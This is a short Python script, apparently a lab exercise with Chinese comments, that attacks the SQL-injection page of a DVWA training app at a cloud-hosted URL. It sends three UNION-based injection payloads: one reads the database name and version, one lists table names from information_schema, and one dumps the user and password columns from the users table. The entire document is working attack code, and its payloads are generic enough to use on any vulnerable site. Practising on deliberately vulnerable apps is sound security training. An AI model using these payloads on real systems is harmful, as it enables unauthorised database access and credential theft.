import requests
BASE_URL = "https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/vulnerabilities/sqli/"
PHPSESSID = "123"

cookies = {
    "PHPSESSID": PHPSESSID,
    "security": "low"
}

# 获取数据库名、版本
payload = "1' and 1=2 union select database(),version()#"
r = requests.get(BASE_URL, params={"id":payload}, cookies=cookies)
print("库名版本:\n", r.text)

# 获取全部表名
payload = "1' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'#"
r = requests.get(BASE_URL, params={"id":payload}, cookies=cookies)
print("\n表名:\n", r.text)

# users表账号密码
payload = "1' and 1=2 union select user,password from users#"
r = requests.get(BASE_URL, params={"id":payload}, cookies=cookies)
print("\n账号密码:\n", r.text)
